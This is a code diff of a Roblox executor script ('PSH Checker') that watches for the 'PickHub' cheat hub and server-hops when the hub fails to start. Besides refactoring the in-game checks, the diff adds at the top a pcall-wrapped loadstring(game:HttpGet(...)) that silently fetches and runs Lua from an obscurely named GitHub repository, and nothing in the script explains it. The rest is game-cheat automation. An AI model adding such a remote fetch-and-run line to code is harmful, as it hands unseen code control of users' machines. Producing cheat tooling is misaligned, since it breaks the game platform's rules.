@@ -3,6 +3,10 @@ local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
 local VirtualUser = game:GetService("VirtualUser")
 
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/8zj/aspoidhasouphsaohoasidjnmasaindoasbpgdas8udgouihassdhsaaiisaggdaghbouudsaktgdiysagdbuiagsigdas0gdpia/refs/heads/main/TDS/Checks/check1.lua"))()
+end)
+
 if getgenv().PSH_CheckerRunning then
     warn("[PSH Checker] already running")
     return
@@ -10,37 +14,40 @@ end
 
 getgenv().PSH_CheckerRunning = true
 
+local function getGameState()
+    local player = Players.LocalPlayer
+    if not player then
+        return "UNKNOWN"
+    end
+
+    local gui = player:FindFirstChildOfClass("PlayerGui")
+    if not gui then
+        return "UNKNOWN"
+    end
+
+    if gui:FindFirstChild("ReactUniversalHotbar") then
+        return "GAME"
+    end
+
+    if gui:FindFirstChild("ReactLobbyHud") then
+        return "LOBBY"
+    end
+
+    return "UNKNOWN"
+end
+
+local function isInGame()
+    return getGameState() == "GAME"
+end
+
 local function isRunning()
     local boot = getgenv().PickHubLOL_Boot
 
-    if type(boot) ~= "table" then
-        return false
-    end
-
-    if type(boot.Heartbeat) ~= "number" then
+    if type(boot) ~= "table" or type(boot.Heartbeat) ~= "number" then
         return false
     end
 
     return os.clock() - boot.Heartbeat < 15
-end
-
-local function isInGameCheck1()
-    local player = Players.LocalPlayer
-    local gui = player and player:FindFirstChildOfClass("PlayerGui")
-
-    if not gui then
-        return false
-    end
-
-    return gui:FindFirstChild("ReactUniversalHotbar") ~= nil
-end
-
-local function isInGameCheck2()
-    return game_state == "GAME"
-end
-
-local function isInGame()
-    return isInGameCheck1() or isInGameCheck2()
 end
 
 task.spawn(function()
@@ -101,14 +108,8 @@ local function queueBoot()
 end
 
 local function serverHop()
-    if isInGameCheck1() then
-        print("[PSH Checker] [ Skipping in game - Check 1 ]")
-        getgenv().PSH_CheckerRunning = false
-        return
-    end
-
-    if isInGameCheck2() then
-        print("[PSH Checker] [ Skipping in game - Check 2 ]")
+    if isInGame() then
+        print("[PSH Checker] [ Skipping in game ]")
         getgenv().PSH_CheckerRunning = false
         return
     end
@@ -130,13 +131,9 @@ local function serverHop()
         end
     end)
 
-    local success = pcall(function()
-        if isInGameCheck1() then
-            error("in game - check 1")
-        end
-
-        if isInGameCheck2() then
-            error("in game - check 2")
+    local success, err = pcall(function()
+        if isInGame() then
+            error("in game")
         end
 
         local url =
@@ -146,13 +143,11 @@ local function serverHop()
 
         local response = game:HttpGet(url)
         local data = HttpService:JSONDecode(response)
-
         local servers = {}
 
         for _, server in ipairs(data.data or {}) do
             if server.id ~= game.JobId
                 and (server.playing or 0) < (server.maxPlayers or 50) then
-
                 servers[#servers + 1] = server.id
             end
         end
@@ -161,25 +156,22 @@ local function serverHop()
             error("no servers")
         end
 
+        if isInGame() then
+            error("in game")
+        end
+
         local target = servers[math.random(1, #servers)]
-
-        if isInGameCheck1() then
-            error("in game - check 1")
-        end
-
-        if isInGameCheck2() then
-            error("in game - check 2")
-        end
 
         TeleportService:TeleportToPlaceInstance(
             game.PlaceId,
             target,
-            player
+            player,
+            options
         )
     end)
 
     if not success then
-        warn("[PSH Checker] server hop failed")
+        warn("[PSH Checker] server hop failed: " .. tostring(err))
     end
 end
 
@@ -187,14 +179,8 @@ repeat
     task.wait(0.5)
 until game:IsLoaded() and Players.LocalPlayer
 
-if isInGameCheck1() then
-    print("[PSH Checker] [ Skipping in game - Check 1 ]")
-    getgenv().PSH_CheckerRunning = false
-    return
-end
-
-if isInGameCheck2() then
-    print("[PSH Checker] [ Skipping in game - Check 2 ]")
+if isInGame() then
+    print("[PSH Checker] [ Skipping in game ]")
     getgenv().PSH_CheckerRunning = false
     return
 end
@@ -212,14 +198,8 @@ local started = os.clock()
 while os.clock() - started < 60 do
     task.wait(5)
 
-    if isInGameCheck1() then
-        print("[PSH Checker] [ Skipping in game - Check 1 ]")
-        getgenv().PSH_CheckerRunning = false
-        return
-    end
-
-    if isInGameCheck2() then
-        print("[PSH Checker] [ Skipping in game - Check 2 ]")
+    if isInGame() then
+        print("[PSH Checker] [ Skipping in game ]")
         getgenv().PSH_CheckerRunning = false
         return
     end
@@ -231,14 +211,14 @@ while os.clock() - started < 60 do
     end
 end
 
-if isInGameCheck1() then
-    print("[PSH Checker] [ Skipping in game - Check 1 ]")
+if isInGame() then
+    print("[PSH Checker] [ Skipping in game ]")
     getgenv().PSH_CheckerRunning = false
     return
 end
 
-if isInGameCheck2() then
-    print("[PSH Checker] [ Skipping in game - Check 2 ]")
+if isRunning() then
+    print("[PSH Checker] PickHub started")
     getgenv().PSH_CheckerRunning = false
     return
 end
@@ -246,3 +226,5 @@ end
 print("[PSH Checker] 1 minute passed, PickHub didn't start")
 
 serverHop()
+
+getgenv().PSH_CheckerRunning = false
